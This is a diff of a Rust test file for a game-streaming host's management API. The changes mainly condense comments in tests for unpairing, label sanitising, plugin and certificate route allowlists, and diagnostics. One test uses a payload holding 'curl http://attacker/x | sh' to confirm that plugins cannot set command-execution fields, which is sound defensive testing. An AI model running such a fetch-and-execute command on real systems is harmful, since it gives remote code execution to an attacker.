         axum::http::Request::delete(format!("/api/v1/clients/{fp}"))
             .body(Body::empty())
@@ -1040,19 +957,15 @@ async fn paired_clients_list_and_unpair() {
     assert_eq!(body, serde_json::json!([]));
     assert_eq!(send(&app, del(fingerprint)).await.0, StatusCode::NOT_FOUND);
 
-    // The unpair persisted: paired.json in the (test-scoped) config dir holds the emptied
-    // list — a restart must not resurrect the pairing (it would re-open the control port).
-    // (`PUNKTFUNK_CONFIG_DIR` is used verbatim — no `punktfunk` subdirectory appended.)
+    // Restart must not resurrect the pairing (that re-opens the control port).
+    // `PUNKTFUNK_CONFIG_DIR` is used verbatim — no `punktfunk` subdirectory.
     let disk = std::fs::read(tmp.path().join("paired.json")).expect("unpair persisted paired.json");
     assert_eq!(
         serde_json::from_slice::<Vec<Vec<u8>>>(&disk).unwrap(),
         Vec::<Vec<u8>>::new()
     );
 
-    // ---- the COLLECTION delete: unpair everything at once -----------------------------------
-    //
-    // Re-seed two clients (the store was just emptied) and clear the teardown flags, so what the
-    // bulk delete does to a live session is attributable to IT and not left over from above.
+    // Re-seed two clients and clear teardown flags so bulk-delete's session effect is not leftover.
     let second = crate::identity::ephemeral().unwrap();
     let (_, second_pem) = x509_parser::pem::parse_x509_pem(second.cert_pem.as_bytes()).unwrap();
     let second_der = second_pem.contents.clone();
@@ -1065,8 +978,7 @@ async fn paired_clients_list_and_unpair() {
         p.push(second_der);
         state.quit.store(false, Ordering::SeqCst);
         state.streaming.store(true, Ordering::SeqCst);
-        // A live session owned by the SECOND client — the bulk delete must end whichever of the
-        // removed certs owns it, not just the first one it happens to walk past.
+        // Session owned by the second client — bulk delete must end whichever revoked cert owns it.
         let mut owner = [0u8; 32];
         owner.copy_from_slice(&hex::decode(&second_fp).unwrap());
         *state.launch.lock().unwrap() = Some(LaunchSession {
@@ -1100,26 +1012,21 @@ async fn paired_clients_list_and_unpair() {
         );
         assert!(state.quit.load(Ordering::SeqCst));
     }
-    // Persisted, for the same reason the single unpair is: a resurrected pairing would re-open
-    // the control port on the next boot.
+    // Same persist check: a resurrected pairing would re-open the control port.
     let disk = std::fs::read(tmp.path().join("paired.json")).unwrap();
     assert_eq!(
         serde_json::from_slice::<Vec<Vec<u8>>>(&disk).unwrap(),
         Vec::<Vec<u8>>::new()
     );
 
-    // Idempotent: emptying an empty store is a 200 with a zero count, NOT the single delete's 404.
-    // ("unpair everything" is already satisfied — there is no missing resource to report.)
+    // Emptying an empty store is 200 with count 0, not the single-delete's 404.
     let (status, body) = send(&app, del_all()).await;
     assert_eq!(status, StatusCode::OK);
     assert_eq!(body["unpaired"], 0);
 }
 
-/// Renaming a paired Moonlight client: the round trip, the scrub, the clear, and the cleanup.
-///
-/// Worth a test because the label is the ONLY thing that distinguishes two paired Moonlight
-/// devices — their certificates all carry the same subject — so "the name silently didn't stick"
-/// is indistinguishable from "the device is the other one" in the console.
+/// Moonlight certs share a subject; the label is the only distinction in the console, so
+/// a silent no-op rename is indistinguishable from picking the other device.
 #[allow(clippy::await_holding_lock)]
 #[tokio::test]
 async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
@@ -1144,11 +1051,11 @@ async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
             .unwrap()
     };
 
-    // Unnamed until somebody names it — the field is absent, not an empty string.
+    // Unnamed: the field is absent, not an empty string.
     let (_, body) = send(&app, get_req("/api/v1/clients")).await;
     assert!(body[0]["label"].is_null());
 
-    // Name it (uppercase fingerprint must match too — the path is documented case-insensitive).
+    // Path is case-insensitive; uppercase fingerprint must match too.
     let (status, body) = send(
         &app,
         patch(
@@ -1162,9 +1069,8 @@ async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
     let (_, body) = send(&app, get_req("/api/v1/clients")).await;
     assert_eq!(body[0]["label"], "Living Room TV");
 
-    // The scrub runs: a bidi override could make one paired device read like another in the very
-    // list an operator uses to decide what to unpair, and the whitespace collapse keeps the name
-    // one line. (`\u{202E}` = RIGHT-TO-LEFT OVERRIDE.)
+    // Bidi override could impersonate another device in the unpair list; whitespace collapse keeps one line.
+    // `\u{202E}` is RIGHT-TO-LEFT OVERRIDE.
     let (_, body) = send(
         &app,
         patch(
@@ -1175,8 +1081,7 @@ async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
     .await;
     assert_eq!(body["label"], "Deckevil x");
 
-    // Whitespace-only clears rather than storing a device called "   " (or the sanitizer's
-    // "device <fp8>" fallback, which would look like a successful rename).
+    // Whitespace-only must clear, not store "   " or the sanitizer's "device <fp8>" fallback.
     let (_, body) = send(
         &app,
         patch(fingerprint.clone(), serde_json::json!({ "label": "   " })),
@@ -1184,7 +1089,6 @@ async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
     .await;
     assert!(body["label"].is_null());
 
-    // …and an explicit null clears too.
     send(
         &app,
         patch(
@@ -1200,8 +1104,7 @@ async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
     .await;
     assert!(body["label"].is_null());
 
-    // Malformed fingerprint → 400; unknown-but-well-formed → 404 (naming a device that is not
-    // paired would write a label nothing can ever list or clean up).
+    // Malformed → 400; unknown-but-well-formed → 404 (must not write a label nothing can clean up).
     assert_eq!(
         send(
             &app,
@@ -1221,8 +1124,7 @@ async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
         StatusCode::NOT_FOUND
     );
 
-    // Unpairing forgets the name: it must not survive to be inherited by a later re-pairing of
-    // the same certificate.
+    // Unpair must forget the label so a later re-pair of the same cert does not inherit it.
     send(
         &app,
         patch(
@@ -1273,7 +1175,7 @@ async fn submit_pin_validates_and_requires_pending_pairing() {
         StatusCode::CONFLICT
     );
 
-    // axum's own body rejections must still wear the ApiError envelope (ApiJson).
+    // axum body rejections must still wear the ApiError envelope.
     let (status, body) = send(&app, post("{not json")).await;
     assert_eq!(status, StatusCode::BAD_REQUEST);
     assert!(body["error"].is_string(), "syntax error: {body}");
@@ -1288,8 +1190,7 @@ async fn submit_pin_validates_and_requires_pending_pairing() {
     assert!(body["error"].is_string(), "media type: {body}");
 }
 
-/// A blank token is treated as no token: the mgmt API requires auth always (even on loopback),
-/// so `run` refuses to start unauthenticated rather than serve open.
+/// A blank token is no token: `run` refuses to start unauthenticated, even on loopback.
 #[tokio::test]
 async fn blank_token_rejected() {
     let opts = Options {
@@ -1338,7 +1239,7 @@ async fn stop_session_clears_runtime_state() {
 
 #[tokio::test]
 async fn idr_requires_an_active_stream() {
-    // A live native session (registered by a sibling test) is an active stream to this route.
+    // A sibling test's live native session would look like an active stream to this route.
     let _serial = SESSION_REGISTRY_LOCK.lock().await;
     let state = test_state();
     let app = test_app(state.clone(), None);
@@ -1354,16 +1255,14 @@ async fn idr_requires_an_active_stream() {
     assert!(state.force_idr.load(Ordering::SeqCst));
 }
 
-/// The plugin registry round-trips through the router: register → list (secret-free) → credential
-/// (secret present) → deregister. Guards the wiring, auth, and — the security-critical bit — that
-/// the UI secret never appears in the browser-visible listing (plugin-ui-surface §7, D6).
+/// Register → list (no secret) → credential (secret) → deregister. The listing must never
+/// carry the UI secret.
 #[tokio::test]
 async fn plugin_registry_roundtrip() {
     let app = test_app(test_state(), None);
     let id = "test-plugin-roundtrip";
     let secret = "s3cr3t-abcdefghijkl"; // 19 chars, valid [A-Za-z0-9_-]
 
-    // Register with a UI surface → 204.
     let (status, _) = send(
         &app,
         put_json(
@@ -1377,7 +1276,6 @@ async fn plugin_registry_roundtrip() {
     .await;
     assert_eq!(status, StatusCode::NO_CONTENT);
 
-    // It lists — and the secret appears NOWHERE in the listing body.
     let (status, body) = send(&app, get_req("/api/v1/plugins")).await;
     assert_eq!(status, StatusCode::OK);
     let mine = body
@@ -1394,7 +1292,6 @@ async fn plugin_registry_roundtrip() {
         "the listing must never carry the UI secret"
     );
 
-    // The credential endpoint (server-side proxy lookup) DOES carry it.
     let (status, body) = send(
         &app,
         get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
@@ -1404,7 +1301,6 @@ async fn plugin_registry_roundtrip() {
     assert_eq!(body["secret"], secret);
     assert_eq!(body["port"], 49321);
 
-    // Deregister → gone from the listing, credential 404s.
     let (status, _) = send(
         &app,
         axum::http::Request::delete(format!("/api/v1/plugins/{id}"))
@@ -1425,7 +1321,7 @@ async fn plugin_registry_roundtrip() {
     .await;
     assert_eq!(status, StatusCode::NOT_FOUND);
 
-    // A structurally invalid registration is a 400 (privileged port).
+    // Port 80 is privileged; registration must 400.
     let (status, _) = send(
         &app,
         put_json(
@@ -1437,8 +1333,8 @@ async fn plugin_registry_roundtrip() {
     assert_eq!(status, StatusCode::BAD_REQUEST);
 }
 
-/// Runner log ingest: lines reach the same ring `GET /logs` serves, tagged so the console can tell
-/// them from the host's own, and one chatty plugin can't evict the ring in a single request.
+/// Ingest lands on the same ring `GET /logs` serves, tagged for the console filter.
+/// One request must not be able to evict the ring.
 #[tokio::test]
 async fn plugin_log_ingest_lands_in_the_ring() {
     let app = test_app(test_state(), None);
@@ -1450,7 +1346,7 @@ async fn plugin_log_ingest_lands_in_the_ring() {
             "/api/v1/plugins/logs",
             serde_json::json!({"entries": [
                 {"ts_ms": 1_700_000_000_123u64, "level": "warn", "source": "virtualhere", "msg": marker},
-                // No source: attributed to the runner rather than to nothing.
+                // Empty source is attributed to the runner, not to nothing.
                 {"ts_ms": 1_700_000_000_124u64, "level": "NOTICE", "source": "", "msg": "orphan"},
             ]}),
         ),
@@ -1466,19 +1362,19 @@ async fn plugin_log_ingest_lands_in_the_ring() {
         .iter()
         .find(|e| e["msg"] == marker)
         .expect("ingested line is served by GET /logs");
-    // `plugin:` is what the console's Host/Plugins filter keys on.
+    // `plugin:` is the console Host/Plugins filter key.
     assert_eq!(mine["target"], "plugin:virtualhere");
-    // Lowercase in, canonical out — the console ranks these five and nothing else.
+    // Lowercase in, canonical out; the console ranks these five levels only.
     assert_eq!(mine["level"], "WARN");
     // Stamped when the line happened, not when the batch arrived.
     assert_eq!(mine["ts_ms"], 1_700_000_000_123u64);
 
     let orphan = entries.iter().find(|e| e["msg"] == "orphan").unwrap();
     assert_eq!(orphan["target"], "plugin:runner");
-    // An unranked level would sort as 0 in the console's filter and hide under every setting.
+    // Unranked levels would sort as 0 and hide under every console filter setting.
     assert_eq!(orphan["level"], "INFO");
 
-    // An oversized batch is refused whole rather than half-ingested.
+    // Oversized batch is refused whole, not half-ingested.
     let big: Vec<serde_json::Value> = (0..300)
         .map(|i| serde_json::json!({"ts_ms": 1u64, "level": "INFO", "source": "x", "msg": format!("f{i}")}))
         .collect();
@@ -1490,16 +1386,11 @@ async fn plugin_log_ingest_lands_in_the_ring() {
     assert_eq!(status, StatusCode::BAD_REQUEST);
 }
 
-/// **The plugin lane reaches the library writes but cannot make them run a command** — the H-1 fix.
-///
-/// A provider plugin must be able to reconcile its own entry set, so the ROUTE stays open to it.
-/// What is refused is the pair of fields inside the payload that the host later executes verbatim as
-/// the host user (`/bin/sh -c` on Linux, `cmd.exe /c` on Windows): `prep`, and a `command` launch.
-/// Those are the operator's authority, and the whole trust argument at their execution sites is that
-/// a human typed them into the admin console.
+/// The plugin lane may hit the library write routes, but `prep` and a `command` launch
+/// execute as the host user (`/bin/sh -c` / `cmd.exe /c`). Those fields are operator-only.
 #[tokio::test]
 async fn plugin_lane_cannot_set_command_execution_fields() {
-    let app = test_app(test_state(), None); // admin "test-secret", plugin "plugin-secret"
+    let app = test_app(test_state(), None);
 
     let as_lane = |token: &str, method: &str, path: &str, body: serde_json::Value| {
         axum::http::Request::builder()
@@ -1511,7 +1402,6 @@ async fn plugin_lane_cannot_set_command_execution_fields() {
             .unwrap()
     };
 
-    // The two shapes of the primitive, on the two routes that carry it.
     let prep = serde_json::json!({
         "title": "Pwned",
         "prep": [{"do": "curl http://attacker/x | sh"}],
@@ -1538,8 +1428,7 @@ async fn plugin_lane_cannot_set_command_execution_fields() {
             );
         }
     }
-    // The reconcile route replaces a WHOLE entry set, so every entry is checked — not just the
-    // first. A payload that hides the primitive behind a benign leading entry is still refused.
+    // Reconcile replaces the whole set; a privileged field on any entry, not just the first, is refused.
     let sneaky = serde_json::json!([
         {"external_id": "a", "title": "Innocent"},
         {"external_id": "b", "title": "Pwned",
@@ -1561,10 +1450,8 @@ async fn plugin_lane_cannot_set_command_execution_fields() {
         "a privileged field anywhere in a reconcile payload must be refused"
     );
 
-    // Every refusal above happens BEFORE the catalog is touched, so this test never writes to the
-    // host config dir. The converse — that the operator's own lane may set these fields, and that a
-    // plugin's ordinary catalogue is unaffected — is `library::tests::privileged_field_is_command_
-    // execution_only`, which needs no filesystem either.
+    // Refusals happen before the catalog is touched. Operator-lane converse:
+    // `library::tests::privileged_field_is_command_execution_only`.
     assert!(
         crate::mgmt::auth::AuthLane::Admin.may_set_privileged_fields(),
         "the operator's token is the lane these fields belong to"
@@ -1573,62 +1460,39 @@ async fn plugin_lane_cannot_set_command_execution_fields() {
     assert!(!crate::mgmt::auth::AuthLane::Cert.may_set_privileged_fields());
 }
 
-/// **Every route in the live table is explicitly classified for both non-admin lanes.**
-///
-/// This is the test whose absence produced H-1 and H-2 in the 2026-08-05 review. `plugin_may_access`
-/// used to be a denylist, so a route added after the list was written was granted to the plugin
-/// token silently and no test failed — which is exactly how `/api/v1/library`'s two copies of the
-/// command-execution primitive, and the unconfined art proxy, ended up on the plugin lane across
-/// ~1450 commits.
-///
-/// The gate is an allowlist now, so the failure mode has flipped: a new route is DENIED until it is
-/// classified. This test makes that classification a conscious, reviewed act rather than a silent
-/// default in either direction — adding a route fails the build until its row is added here, and the
-/// row is where a reviewer looks to ask "should a plugin really reach this?".
+/// Every live route has an explicit plugin/cert classification. A new route fails until a
+/// row is added here; a removed route must not leave a stale row. The gates are allowlists:
+/// unclassified means denied.
 #[test]
 fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
     use axum::http::Method;
 
-    // (method, path template, plugin token may reach, paired streaming cert may reach).
-    // EXHAUSTIVE over the live route table — no wildcards, no prefixes, one row per operation.
+    // (method, path, plugin_ok, cert_ok). One row per live operation; no wildcards.
     const EXPECTED: &[(&str, &str, bool, bool)] = &[
-        // ---- host / status: readable by a plugin; the small read-only set is the cert lane's.
+        // Host/status: plugin-readable; the small read-only set is the cert lane's.
         ("GET", "/api/v1/health", true, false), // always open, handled before either gate
         ("GET", "/api/v1/host", true, true),
         ("GET", "/api/v1/status", true, true),
         ("GET", "/api/v1/local/summary", true, false), // loopback-only, handled before the gates
         ("GET", "/api/v1/compositors", true, true),
         ("GET", "/api/v1/events", true, false),
-        // The ring is unredacted host tracing — webhook URLs and hook command lines. Serving it to
-        // the plugin lane made the `/hooks` carve-out decorative (2026-08-25 review H-2).
+        // Unredacted host tracing (webhook URLs, hook command lines). Plugin access would void `/hooks`.
         ("GET", "/api/v1/logs", false, false),
-        // ---- diagnostics: OPERATOR ONLY, both lanes denied. The verdicts name the host's user,
-        // its group layout and the state of its device nodes — a paired streaming client has no
-        // business enumerating any of that, and a plugin that wanted to would be asking for a map
-        // of the box's privilege boundaries. The tray gets counts on `/local/summary` instead.
+        // Diagnostics name the host user, groups, and device nodes. Both lanes denied.
         ("GET", "/api/v1/diagnostics", false, false),
         ("POST", "/api/v1/diagnostics/refresh", false, false),
-        // ---- client log bundles: the UPLOAD is the cert lane's single write — write-only,
-        // size/quota-capped ("send logs to host" from a Deck in Gaming Mode / tvOS). Reading
-        // bundles back is operator business (they can contain whatever the client logged), so
-        // list/fetch/delete stay bearer-only in both lanes.
+        // Upload is the cert lane's single write (size/quota-capped). List/fetch/delete are operator-only.
         ("POST", "/api/v1/client-logs", false, true),
         ("GET", "/api/v1/client-logs", false, false),
         ("GET", "/api/v1/client-logs/{id}", false, false),
         ("DELETE", "/api/v1/client-logs/{id}", false, false),
-        // ---- paired-device rosters: readable by a plugin, never by another paired client, and
-        // removal is pairing administration in both lanes.
+        // Rosters: plugin-readable, never another paired client. Removal is pairing admin in both lanes.
         ("GET", "/api/v1/clients", true, false),
-        // The bulk form is the same authority as the single one — and, sharing its path with a
-        // plugin-readable GET, worth an explicit row: both gates match on (method, path), so the
-        // roster's read permission must never carry over to emptying it.
+        // Bulk DELETE shares the GET path; method+path match, so the read grant must not empty the roster.
         ("DELETE", "/api/v1/clients", false, false),
         ("DELETE", "/api/v1/clients/{fingerprint}", false, false),
-        // Renaming is cosmetic but NOT harmless, so it takes the same lanes as removal rather than
-        // the roster's read permission: the label is the only thing distinguishing one paired
-        // Moonlight device from another in the console, so anything that could set it could dress
-        // its own device up as the operator's TV — and be trusted, or spared an unpair, on that
-        // basis. Sharing a path with the plugin-forbidden DELETE, it needs its own row anyway.
+        // PATCH shares the DELETE path. Labels distinguish Moonlight certs (same subject); setting
+        // one is pairing administration, not a roster read.
         ("PATCH", "/api/v1/clients/{fingerprint}", false, false),
         ("GET", "/api/v1/native/clients", true, false),
         ("DELETE", "/api/v1/native/clients", false, false),
@@ -1638,15 +1502,14 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
             false,
             false,
         ),
-        // Editing a device's grants/expiry is pairing administration in both lanes: a plugin
-        // must not widen (or cut) another device's access, and a paired client even less so.
+        // Grant/expiry edits are pairing administration in both lanes.
         (
             "PATCH",
             "/api/v1/native/clients/{fingerprint}",
             false,
             false,
         ),
-        // ---- pairing administration + PIN visibility: the operator's token alone.
+        // Pairing administration + PIN visibility: operator token alone.
         ("GET", "/api/v1/pair", false, false),
         ("POST", "/api/v1/pair/pin", false, false),
         ("GET", "/api/v1/native/pair", false, false),
@@ -1655,7 +1518,7 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
         ("GET", "/api/v1/native/pending", false, false),
         ("POST", "/api/v1/native/pending/{id}/approve", false, false),
         ("POST", "/api/v1/native/pending/{id}/deny", false, false),
-        // ---- GPU + display: host configuration, no privilege boundary.
+        // GPU + display: host configuration, no privilege boundary.
         ("GET", "/api/v1/gpus", true, false),
         ("PUT", "/api/v1/gpus/preference", true, false),
         ("GET", "/api/v1/display/settings", true, false),
@@ -1668,39 +1531,34 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
         ("POST", "/api/v1/display/presets", true, false),
         ("PUT", "/api/v1/display/presets/{id}", true, false),
         ("DELETE", "/api/v1/display/presets/{id}", true, false),
-        // ---- session control.
+        // Session control.
         ("DELETE", "/api/v1/session", true, false),
         ("POST", "/api/v1/session/idr", true, false),
         ("GET", "/api/v1/session/settings", true, false),
         ("PUT", "/api/v1/session/settings", true, false),
         ("POST", "/api/v1/game/end", true, false),
-        // ---- library. The plugin lane reaches the writes (a scanner plugin's whole job), but the
-        // operator-privileged FIELDS inside those payloads are refused in the handler — see
-        // `plugin_lane_cannot_set_command_execution_fields`.
+        // Library writes are plugin-lane (scanner job); privileged fields inside the payload
+        // are refused in the handler — see `plugin_lane_cannot_set_command_execution_fields`.
         ("GET", "/api/v1/library", true, true),
         ("GET", "/api/v1/library/art/{id}/{kind}", true, true),
         ("GET", "/api/v1/library/scanners", true, false),
         ("PUT", "/api/v1/library/scanners/{id}", true, false),
-        // Hiding a title is the OPERATOR curating their own library: a plugin has no business
-        // deciding what the operator sees, and a paired client must not be able to hide a game on
-        // the host it is streaming from. Neither lane, unlike the scanner toggle above.
+        // Hide is operator curation; neither lane, unlike the scanner toggle.
         ("PUT", "/api/v1/library/hidden/{id}", false, false),
         ("POST", "/api/v1/library/custom", true, false),
         ("PUT", "/api/v1/library/custom/{id}", true, false),
         ("DELETE", "/api/v1/library/custom/{id}", true, false),
         ("PUT", "/api/v1/library/provider/{provider}", true, false),
         ("DELETE", "/api/v1/library/provider/{provider}", true, false),
-        // Liveness for a provider's own titles: the plugin lane's, like the reconcile beside it,
-        // and for the same reason — the host maps the report through the catalog, so a provider can
-        // only ever speak about entries it published. Never the cert lane: a streaming client has
-        // no titles of its own to report on.
+        // Provider liveness is plugin-lane like reconcile; the host maps through the catalog.
+        // Never the cert lane — a streaming client has no titles of its own.
         (
             "PUT",
             "/api/v1/library/provider/{provider}/running",
             true,
             false,
         ),
-        // ---- stats.
+        // Stats.
         ("POST", "/api/v1/stats/capture/start", true, false),
         ("POST", "/api/v1/stats/capture/stop", true, false),
         ("GET", "/api/v1/stats/capture/status", true, false),
@@ -1708,16 +1566,16 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
         ("GET", "/api/v1/stats/recordings", true, false),
         ("GET", "/api/v1/stats/recordings/{id}", true, false),
         ("DELETE", "/api/v1/stats/recordings/{id}", true, false),
-        // ---- plugins: its own directory entry and log ingest, never another plugin's UI secret.
+        // Plugins: own directory entry and log ingest, never another plugin's UI secret.
         ("GET", "/api/v1/plugins", true, false),
         ("POST", "/api/v1/plugins/logs", true, false),
         ("PUT", "/api/v1/plugins/{id}", true, false),
         ("DELETE", "/api/v1/plugins/{id}", true, false),
         ("GET", "/api/v1/plugins/{id}/ui-credential", false, false),
-        // ---- hooks: writing is command execution as the host user; reading exposes webhook creds.
+        // Hooks: write is command execution as the host user; read exposes webhook creds.
         ("GET", "/api/v1/hooks", false, false),
         ("PUT", "/api/v1/hooks", false, false),
-        // ---- the store: installing a plugin runs new code with operator privileges.
+        // Store: installing a plugin runs new code with operator privileges.
         ("GET", "/api/v1/store/catalog", false, false),
         ("POST", "/api/v1/store/refresh", false, false),
         ("GET", "/api/v1/store/installed", false, false),
@@ -1730,20 +1588,17 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
         ("DELETE", "/api/v1/store/sources/{name}", false, false),
         ("GET", "/api/v1/store/runtime", false, false),
         ("POST", "/api/v1/store/runtime", false, false),
-        // ---- updates: `apply` runs an installer / the root helper.
+        // Updates: `apply` runs an installer / the root helper.
         ("GET", "/api/v1/update/status", false, false),
         ("POST", "/api/v1/update/check", false, false),
         ("POST", "/api/v1/update/apply", false, false),
-        // ---- host actions (design/host-actions.md): the cert lane's surface — discovery is
-        // per-caller-filtered, invoke demands the GRANT_POWER bit in the handler. The plugin
-        // token gets NEITHER route: a plugin that wants to power-manage the host is an
-        // operator-hook/automation story, not a shared-token capability (§3.4).
+        // Host actions: cert lane; handler filters discovery and requires GRANT_POWER on invoke.
+        // Plugin token gets neither — power is operator-hook, not a shared-token capability.
         ("GET", "/api/v1/actions", false, true),
         ("POST", "/api/v1/actions/{id}", false, true),
     ];
 
-    /// A path template's concrete form: every `{param}` segment becomes a literal, so the gates
-    /// are exercised on the shape a real request has.
+    /// Substitute a literal for every `{param}` so the gates see a real request path.
     fn concrete(template: &str) -> String {
         template
             .split('/')
@@ -1752,8 +1607,7 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
             .join("/")
     }
 
-    // The GameStream PIN routes exist only in gamestream-featured builds (WP19) — drop their
-    // rows from the expectation when the feature is off (`cfg!` keeps both sides type-checked).
+    // PIN routes exist only in gamestream-featured builds; `cfg!` keeps both sides type-checked.
     let expected: Vec<(&str, &str, bool, bool)> = EXPECTED
         .iter()
         .copied()
@@ -1771,7 +1625,7 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
         }
     }
 
-    // 1. Every LIVE route has a classification row. A new route fails here until it gets one.
+    // 1. Every live route has a row.
     for (method, path) in &live {
         assert!(
             expected.iter().any(|(m, p, _, _)| m == method && p == path),
@@ -1780,14 +1634,14 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
              reach it"
         );
     }
-    // 2. No STALE rows: a removed route must not leave a classification behind claiming coverage.
+    // 2. No stale rows for removed routes.
     for (method, path, _, _) in &expected {
         assert!(
             live.iter().any(|(m, p)| m == method && p == path),
             "EXPECTED lists {method} {path}, which is not in the live route table — remove the row"
         );
     }
-    // 3. The gates agree with the classification, on both lanes.
+    // 3. Gates match the classification on both lanes.
     for (method, path, plugin_ok, cert_ok) in &expected {
         let m = Method::from_bytes(method.as_bytes()).unwrap();
         let concrete = concrete(path);
@@ -1806,12 +1660,11 @@ fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
     }
 }
 
-/// The allowlist is segment-wise, so a route that merely *starts with* an allowed one is not
-/// swallowed by it — the failure that a `starts_with` denylist/allowlist invites.
+/// Segment-wise match: a path that merely starts with an allowed one is not swallowed.
 #[test]
 fn plugin_allowlist_matches_whole_segments_only() {
     use axum::http::Method;
-    // The UI credential sits one segment below an allowed route and must stay denied.
+    // UI credential sits one segment below an allowed route and must stay denied.
     assert!(auth::plugin_may_access(
         &Method::PUT,
         "/api/v1/plugins/rom-manager"
@@ -1820,7 +1673,7 @@ fn plugin_allowlist_matches_whole_segments_only() {
         &Method::GET,
         "/api/v1/plugins/rom-manager/ui-credential"
     ));
-    // A hypothetical future sub-route of an allowed route is denied until classified.
+    // Unclassified sub-route of an allowed path stays denied.
     assert!(!auth::plugin_may_access(
         &Method::GET,
         "/api/v1/library/secrets"
@@ -1829,13 +1682,12 @@ fn plugin_allowlist_matches_whole_segments_only() {
         &Method::POST,
         "/api/v1/session/settings/x"
     ));
-    // Method matters: the roster is readable, its removal is not.
     assert!(auth::plugin_may_access(&Method::GET, "/api/v1/clients"));
     assert!(!auth::plugin_may_access(
         &Method::DELETE,
         "/api/v1/clients/aabbcc"
     ));
-    // A path prefix that is not a segment prefix must not match at all.
+    // A letter-prefix that is not a segment prefix must not match.
     assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/statuses"));
     assert!(!auth::plugin_may_access(
         &Method::GET,
@@ -1843,10 +1695,8 @@ fn plugin_allowlist_matches_whole_segments_only() {
     ));
 }
 
-/// The OpenAPI document lists every route with a unique operationId (codegen relies
-/// on both), and the checked-in copy is current. Feature-gated: `api/openapi.json` IS the
-/// default-features document — a native-only build's spec (no PIN routes) is intentionally
-/// different and not checked in (WP19).
+/// Unique operationIds (codegen) and a current checked-in snapshot. `api/openapi.json` is
+/// the default-features document; a native-only spec (no PIN routes) is intentionally not checked in.
 #[cfg(feature = "gamestream")]
 #[test]
 fn openapi_document_is_complete_and_checked_in() {
@@ -1878,19 +1728,15 @@ fn openapi_document_is_complete_and_checked_in() {
     op_ids.dedup();
     assert_eq!(total, op_ids.len(), "duplicate operationIds");
     assert!(doc["components"]["securitySchemes"]["bearerAuth"].is_object());
-    // The health probe overrides the document-global bearer requirement (the server
-    // exempts it in `require_auth`; the spec must agree).
+    // Health overrides the document-global bearer; the spec must match `require_auth`.
     assert_eq!(
         doc["paths"]["/api/v1/health"]["get"]["security"],
         serde_json::json!([{}])
     );
 
     let checked_in = include_str!("../../../../api/openapi.json");
-    // Compare STRUCTURALLY with `info.version` normalized on both sides: the served document
-    // stamps the live crate version, but a version bump alone must never invalidate the
-    // snapshot — the API *surface* is what drift-control protects (the 0.5.0 release tripped
-    // on exactly this). Structural comparison also makes line endings a non-issue (git may
-    // check the file out CRLF on Windows).
+    // Structural compare with `info.version` normalized: a version bump must not fail the snapshot.
+    // JSON compare also ignores CRLF checkouts on Windows.
     let mut generated = doc;
     let mut snapshot: serde_json::Value = serde_json::from_str(checked_in).unwrap();
     generated["info"]["version"] = serde_json::json!("<any>");
@@ -1909,8 +1755,7 @@ fn post_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
         .unwrap()
 }
 
-/// Diagnostics are operator business: the verdicts carry the host user's name, its group layout and
-/// the state of its device nodes.
+/// Verdicts carry the host user, group layout, and device-node state.
 #[tokio::test]
 async fn diagnostics_require_the_operator_token() {
     let app = test_app(test_state(), Some("sekrit"));
@@ -1927,13 +1772,10 @@ async fn diagnostics_require_the_operator_token() {
     }
 }
 
-/// The shape the console renders: a worst-first list in which every registered check appears, `ok`
-/// and `inapplicable` rows included (the troubleshooting page shows what works, and can answer why
-/// a check does not apply here).
+/// Worst-first list; every registered check appears, including `ok` and `inapplicable`.
 #[tokio::test]
 async fn diagnostics_report_the_registered_checks() {
-    // The registry is a process-global primed at `serve` startup; take the same first reading here
-    // rather than asserting against whatever another test in this binary left behind.
+    // Process-global registry; take a first reading here rather than whatever a sibling left.
     crate::diagnostics::preflight();
     let app = test_app(test_state(), None);
     let (status, body) = send(&app, get_req("/api/v1/diagnostics")).await;
@@ -1946,7 +1788,7 @@ async fn diagnostics_report_the_registered_checks() {
         "the v1 catalog is registered at startup"
     );
 
-    // Ids are the console's i18n keys; a rename silently drops every translation.
+    // Ids are console i18n keys; a rename silently drops every translation.
     let ids: Vec<&str> = checks.iter().filter_map(|c| c["id"].as_str()).collect();
     for expected in [
         "takeover_privilege",
@@ -1957,8 +1799,7 @@ async fn diagnostics_report_the_registered_checks() {
         assert!(ids.contains(&expected), "missing check {expected}: {ids:?}");
     }
 
-    // The N/N−1 drift guarantee on the wire, not just in the registry's own unit test: a console
-    // that predates a check has nothing but these strings to render.
+    // N/N−1 on the wire: an older console has only these strings to render.
     for check in checks {
         let id = check["id"].as_str().unwrap();
         assert!(
@@ -1990,7 +1831,6 @@ async fn diagnostics_report_the_registered_checks() {
     }
 }
 
-/// Refresh re-runs the probes and answers with the fresh report — the "did that fix it?" button.
 #[tokio::test]
 async fn diagnostics_refresh_reruns_and_returns_the_report() {
     let app = test_app(test_state(), None);
@@ -2002,18 +1842,13 @@ async fn diagnostics_refresh_reruns_and_returns_the_report() {
 
     let checks = body["checks"].as_array().expect("checks array");
     assert!(!checks.is_empty(), "refresh answers with the full catalog");
-    // NOT asserted here: that every row reports `source: "refresh"`. The registry is a
-    // process-global and a sibling test in this binary primes it with a startup reading, so that
-    // assertion would be a parallel-test race. `source` is pinned on an isolated registry in
-    // `crate::diagnostics::tests::refresh_reruns_every_probe`, which is where it belongs.
+    // Do not assert `source: "refresh"`: the registry is process-global and a sibling may have
+    // primed a startup reading. Isolated pin: `diagnostics::tests::refresh_reruns_every_probe`.
     assert!(checks.iter().all(|c| c["id"].is_string()));
 }
 
